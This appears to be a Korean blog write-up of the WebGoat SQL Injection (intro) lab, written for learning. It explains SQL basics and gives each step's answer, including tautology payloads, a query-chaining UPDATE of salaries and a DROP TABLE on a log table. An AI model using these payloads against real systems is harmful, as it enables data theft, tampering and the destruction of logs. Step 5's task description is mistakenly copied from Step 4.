---
title: " WebGoat - SQL Injection(intro) 문제풀이"
excerpt: ".."
categories: ['webgoat']
typora-root-url: ../../
published: true
date: 2025-12-22
tags: ['sql', 'injection', 'webgoat', 'web-security']
---

## 개념 정리

SQL Injection(SQLi)은 애플리케이션이 사용자 입력을 적절히 검증·구조화하지 않고 데이터베이스 쿼리 문자열에 직접 삽입할 때 발생하는 취약점입니다. 공격자는 악의적인 문자열(페이로드)을 입력해 원래 의도된 SQL 문을 변조함으로써 다음과 같은 행위를 할 수 있습니다.

- 인증 우회: 로그인 쿼리의 조건을 항상 참으로 만들어 로그인 제한을 무력화.
- 민감 데이터 유출: 비밀번호, 개인정보, 신용카드 등 테이블 전체를 열람.
- 데이터 변조/삭제: UPDATE, DELETE, DROP 등을 실행하여 데이터 손상.
- 권한 상승 및 원격 코드 실행의 발판: 일부 DBMS에서 시스템 명령 실행 가능.

왜 위험한가 (구체적 설명)
- 데이터베이스는 애플리케이션의 신뢰 경계 바깥에 있는 중요한 자원입니다. 쿼리문이 문자열 연결로 구성되면 공격자는 쿼리의 논리를 서브버트(subvert)할 수 있습니다.
- 예: 애플리케이션이 아래와 같이 문자열을 단순 연결한다고 가정하면,
  SELECT * FROM users WHERE username = '입력' AND password = '입력';
  사용자가 입력에 작은따옴표(')와 논리식을 넣으면 본래 조건이 변조되어 인증 없이 접근 허용 가능.
- 보통 에러 메시지/타이밍/응답 내용으로 데이터베이스 구조(컬럼명, 테이블명)를 추측해 더 정교한 공격을 이어갈 수 있습니다.

취약하게 작동하는 예 (취약 쿼리)
- 취약한 로그인 쿼리 예:
  SELECT * FROM users WHERE username = ' " + username + " ' AND password = ' " + password + " ';
- 이 한 줄의 의미: 애플리케이션이 username, password 변수를 문자열로 연결해 쿼리문을 만듦. 사용자가 악의적 문자열을 넣으면 쿼리의 조건 자체를 변경할 수 있음.

## 실습 환경

- 대상 레슨: WebGoat — "SQL Injection (intro)" (WebGoat 기본 제공 실습)
- 요구 사항: WebGoat(로컬 또는 도커로 실행), 브라우저
- WebGoat 접속 예시: http://localhost:8080/WebGoat
- 스크린샷: 
  - 예: 메인화면![WebGoat 메인 화면](/images/2025-12-22-sql_injection/image-20251222112103919.png)



## 문제 풀이

### Step 1: WebGoat SQL Injection (intro) 레슨 접속
- 브라우저에서 WebGoat에 접속하고 로그인.

- 애플리케이션 내 메뉴에서 "Injection" → "SQL Injection (intro)" 레슨을 선택

- 화면(예시): ![SQL Injection (intro) 메인](/images/2025-12-22-sql_injection/66076.png)

  

### Step 2: What is SQL?
- 이 문제는 SQL의 가장 기초적인 문법인 `SELECT` 문을 사용하여 특정 데이터를 추출하는 연습입니다. **'Bob Franco'라는 직원의 부서(department) 정보를 가져오는 것**입니다.
- 화면(예시): ![일반 로그인 시도](/images/2025-12-22-sql_injection/19551.png)
- 정답: `SELECT department FROM employees WHERE first_name = 'Bob' AND last_name = 'Franco';`

#### 쿼리 설명

1. **`SELECT department`**: 테이블의 여러 컬럼 중 'department' 컬럼의 데이터만 보여달라는 의미
2. **`FROM employees`**: 데이터를 찾을 테이블의 이름이 'employees'임을 지정
3. **`WHERE first_name = 'Bob' AND last_name = 'Franco'`**: 수많은 행(row) 중에서 이름이 'Bob'이고 성이 'Franco'인 사람의 데이터만 필터링. (문자열은 반드시 작은따옴표 `' '`로 감싸야 합니다.)

### Step 3: SQL DML(Data Manipulation Language)
- SQL의 **DML(Data Manipulation Language, 데이터 조작어)** 중 데이터를 수정하는 `UPDATE` 문을 사용하는 연습입니다.

- **'Tobi Barnett'이라는 직원의 부서(department)를 'Sales'로 변경**해보기
- 화면(예시): 
  
  ![DML](/images/2025-12-22-sql_injection/image-20251222112826199.png)
- 정답: `UPDATE employees SET department = 'Sales' WHERE first_name = 'Tobi' AND last_name = 'Barnett';`

#### 쿼리 설명

1. **`UPDATE employees`**: 데이터를 수정할 대상 테이블이 `employees`임을 지정
2. **`SET department = 'Sales'`**: 해당 행의 `department` 컬럼 값을 'Sales'라는 새로운 값으로 변경하겠다는 명령
3. **`WHERE first_name = 'Tobi' AND last_name = 'Barnett'`**: 테이블 내의 모든 데이터가 아닌, 이름이 'Tobi'이고 성이 'Barnett'인 특정 직원의 레코드만 찾아 수정하도록 조건을 설정

**참고:** SQL 문장에서 문자열 값(Sales, Tobi, Barnett 등)은 반드시 작은따옴표(`' '`)로 감싸주어야 정확하게 인식됩니다.


### Step 4: SQL **데이터 정의 언어(DDL, Data Definition Language)
`employees` 테이블에 **`phone`이라는 새로운 컬럼(데이터 타입: `varchar(20)`)을 추가**

- 화면(예시): ![DDL](/images/2025-12-22-sql_injection/96864.png)
- 정답: `ALTER TABLE employees ADD phone varchar(20);` 



### Step 5: SQL Data Control Language (DCL)

`employees` 테이블에 **`phone`이라는 새로운 컬럼(데이터 타입: `varchar(20)`)을 추가**

- 화면(예시): ![DCL](/images/2025-12-22-sql_injection/57871.png)
- 정답: `GRANT ALL ON grant_rights TO unauthorized_user;`



### Step 6: What is SQL injection?

#### **SQL 인젝션이란 무엇인가?**

  **SQL 인젝션**(SQLi라고도 함)은 가장 흔한 웹 해킹 기술 중 하나입니다. SQL 인젝션 공격은 클라이언트에서 애플리케이션으로 전달되는 SQL 쿼리 입력값에 **악성 코드를 삽입하거나 "주입(Injection)"**하는 방식으로 이루어집니다. 이를 적절히 처리하지 않으면 데이터의 무결성과 보안에 심각한 영향을 미칠 수 있습니다.

  SQL 인젝션은 검색창 입력값과 같이 클라이언트로부터 전달된 필터링 되지 않은 데이터가 애플리케이션의 SQL 해석기(Interpreter)로 직접 전달될 때 발생합니다. 애플리케이션이 **준비된 명령문(Prepared Statements)** 등을 사용하여 사용자 입력을 올바르게 정리(Sanitize)하지 않거나 특수 문자를 필터링하지 못하면, 해커는 기본 SQL 문을 자신에게 유리하게 조작할 수 있습니다.

  예를 들어, SQL 문에서 특별한 의미를 갖는 메타 문자들, 즉 `--`(해당 줄의 나머지 부분을 주석 처리)이나 `;`(SQL 쿼리 종료)와 같은 문자들이 필터링 되지 않으면 SQL 인젝션이 발생할 수 있습니다.

------

#### **SQL 인젝션의 예시**

  사용자가 폼 필드에 사용자 이름(Username)을 입력하기만 하면 정보를 조회할 수 있는 웹 애플리케이션이 있다고 가정해 보겠습니다. 사용자의 입력값은 서버로 전송되어 SQL 쿼리에 삽입된 후 SQL 해석기에 의해 처리됩니다.

  데이터베이스에서 사용자 정보를 조회하는 SQL 쿼리는 다음과 같습니다:

  "SELECT * FROM users WHERE name = '" + userName + "'";

  여기서 userName 변수는 클라이언트의 입력값을 받아 쿼리에 "주입"합니다. 만약 입력값이 Smith라면 쿼리는 다음과 같이 변하며, 이름이 Smith인 사용자의 모든 데이터를 조회하게 됩니다:

  "SELECT * FROM users WHERE name = 'Smith'";

  하지만 공격자가 SQL 해석기에 특별한 의미를 갖는 문자나 문자열(예: `;`, `--`, `'`)을 입력하고, 이 데이터가 올바르게 정화되거나 검증되지 않는다면, 공격자는 **SQL 쿼리의 의도된 동작을 수정**하여 데이터베이스에 악의적인 작업을 수행할 수 있습니다.

------

#### **공격 사례**

  SQL 인젝션은 단순히 한 명의 사용자 데이터를 읽는 것 이상의 용도로 사용될 수 있습니다. 다음은 해커가 취약점을 악용하기 위해 입력할 수 있는 몇 가지 사례입니다.

  - **`Smith' OR '1' = '1`**
    - 결과: `SELECT * FROM users WHERE name = 'Smith' OR TRUE;`
    - 효과: 모든 사용자의 정보를 반환합니다.
  - **`Smith' OR 1 = 1; --`**
    - 결과: `SELECT * FROM users WHERE name = 'Smith' OR TRUE;--';`
    - 효과: 위와 동일하게 모든 사용자 정보를 반환하며, 뒤의 쿼리는 주석 처리됩니다.
  - **`Smith'; DROP TABLE users; TRUNCATE audit_log; --`**
    - 효과: 여러 SQL 명령을 연결하여 `users` 테이블을 삭제(**DROP**)하고 `audit_log` 테이블의 모든 기록을 비웁니다(**TRUNCATE**).


### Step 9: String SQL injection

사용자 이름을 몰라도 `users` 테이블에 있는 **모든 사용자 정보**를 다 훔쳐보기

- 화면(예시): ![String](/images/2025-12-22-sql_injection/image-20251222141955859.png)
- 정답: `SELECT * FROM user_data WHERE first_name = 'John' AND last_name = 'Smith' OR '1' = '1';`
- **설명:**  원래는 이름이 딱 맞아야 정보를 보여주지만, 뒤에 `OR '1' = '1'`을 붙이면 어떻게 될까?
  - `'1' = '1'`은 **항상 참(True)**이기 때문에, 앞의 이름이 틀려도 컴퓨터는 "어? 뒤가 참이네? 그럼 다 보여줘야지!"라고 착각되어 모든 사용자의 정보를 반환해줍니다.




### Step 10: Numeric SQL injection

따옴표(`'`)가 없는 **숫자 데이터**를 조작하여 모든 데이터를 탈취

- 화면(예시): ![Numeric](/images/2025-12-22-sql_injection/18945.png)
- 정답: 두 개의 입력창 중 **`User_Id`** 칸에 아래 내용을 입력
  - **Login_Count:** `0` (아무 숫자나 입력)
  - **User_Id:** `1 OR 1=1`

- 공격 코드가 삽입되면 서버는 다음과 같은 명령을 실행하게 됩니다: `SELECT * FROM user_data WHERE login_count = 0 AND userid = 1 OR 1=1;`
  - `1=1`은 항상 **참(True)**이기 때문에, 앞의 조건과 상관없이 데이터베이스는 테이블에 있는 **모든 사용자 정보를 반환**하게 됩니다.



### Step 11: 기밀성 침해 - Compromising confidentiality with String SQL injection

실제 공격 상황처럼 주어진 정보를 바탕으로 **다른 모든 직원의 민감한 정보(급여 등)**를 훔쳐보는 것이 목표

- 화면(예시): ![Compromising](/images/2025-12-22-sql_injection/52986.png)
- 정답: 
  - **Employee Name:** `Smith` (정상적인 이름을 입력)
  - **Authentication TAN:** `' OR '1'='1`


- 설명 : 맨 마지막에 붙은 **`OR '1' = '1'`**이 앞의 모든 조건(`AND` 포함)을 무시하고 전체 문장을 **항상 참(True)**으로 만듭니다.



### Step 12: Compromising Integrity with Query chaining

쿼리 체이닝으로 무결성 침해, 이번 단계는 데이터의 **무결성(Integrity)**을 침해하는 연습입니다. 단순히 정보를 훔쳐보는 것에서 나아가, 데이터베이스의 내용을 공격자가 원하는 대로 **수정**하는 방법 실습합니다.

#### **SQL 쿼리 체이닝이란?**

- 말 그대로 원래의 SQL 쿼리 뒤에 **하나 이상의 새로운 쿼리를 덧붙이는 것**
- SQL 문장의 끝을 알리는 메타 문자인 **세미콜론(`;`)**을 사용. `;`을 찍으면 한 줄에서도 새로운 SQL 문장을 바로 시작

- 화면(예시): ![Query_chaining](/images/2025-12-22-sql_injection/62046.png)



- 정답: 두 칸 중 아무 곳이나 공격할 수 있지만, **Employee Name** 칸을 기준으로 작성
  1. **Employee Name:** `Smith'; UPDATE employees SET salary = '99999' WHERE last_name = 'Smith`
  2. **Authentication TAN:** `3SL99A` (본인의 실제 TAN 번호 입력)



- 설명: 이 문제의 핵심은 원래의 `SELECT` 문을 적당히 마무리하고, `;` 뒤에 월급을 수정하는 `UPDATE` 문을 삽입하는 것입니다.

서버 내부에서 완성되는 쿼리는 다음과 같은 모습이 됩니다:

```
SELECT * FROM employees WHERE last_name = 'Smith'; UPDATE employees SET salary = '99999' WHERE last_name = 'Smith' AND auth_tan = '3SL99A';
```

1. **`last_name = 'Smith';`**: 첫 번째 `SELECT` 문이 정상적으로 종료됩니다.
2. **`UPDATE employees SET salary = '99999' ...`**: 데이터베이스는 `;` 뒤에 오는 이 문장을 **완전히 새로운 별개의 명령**으로 인식하고 실행합니다.
3. 그 결과, 데이터베이스 안에 저장된 John Smith의 급여 수치가 99,999로 수정됩니다.

**주의 사항:** 웹고트 환경에 따라 `UPDATE` 문 뒤에 주석 처리(`--`)를 붙여야 할 수도 있습니다. 만약 위 코드가 안 된다면 이름 칸에 `Smith'; UPDATE employees SET salary = '99999' WHERE last_name = 'Smith'; --` 라고 입력해봅니다.



### Step 13: Compromising Availability

이 단계는 보안의 3대 요소(CIA) 중 마지막인 **가용성(Availability)**을 침해하는 연습입니다. 가용성이란 "필요할 때 데이터에 접근할 수 있는 상태"를 말하며, 이를 침해한다는 것은 데이터를 삭제하거나 시스템을 마비시켜 사용하지 못하게 만드는 것을 의미합니다.

- 화면(예시): ![Availability](/images/2025-12-22-sql_injection/29462.png)
- 정답: `x'; DROP TABLE access_log; --`

- 설명:

서버 내부에서는 입력한 값을 받아 다음과 같은 형태의 쿼리를 실행하려고 할 것입니다: `SELECT * FROM logs WHERE action = '[입력값]'`

우리가 공격 코드를 넣으면 최종 쿼리는 이렇게 변합니다:

 ````
 SELECT * FROM logs WHERE action = 'x'; DROP TABLE access_log; --'
 ````

1. **`action = 'x';`**: 먼저 기존의 검색 쿼리를 세미콜론으로 강제 종료합니다.
2. **`DROP TABLE access_log;`**: 데이터베이스에 "access_log 테이블을 삭제하라"는 새로운 명령을 내립니다. 이것이 실행되면 로그 기록 자체가 사라져 가용성이 파괴됩니다.
3. **`--`**: 뒤에 남아있을지 모르는 서버의 나머지 쿼리 문법(닫는 따옴표 등)을 주석 처리하여 에러가 나지 않게 막아줍니다.




## 참고 자료

- OWASP SQL Injection 페이지: https://owasp.org/www-community/attacks/SQL_Injection
- OWASP SQLi Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
- WebGoat 프로젝트: https://github.com/WebGoat/WebGoat
- JDBC PreparedStatement 문서: https://docs.oracle.com/javase/8/docs/api/java/sql/PreparedStatement.html
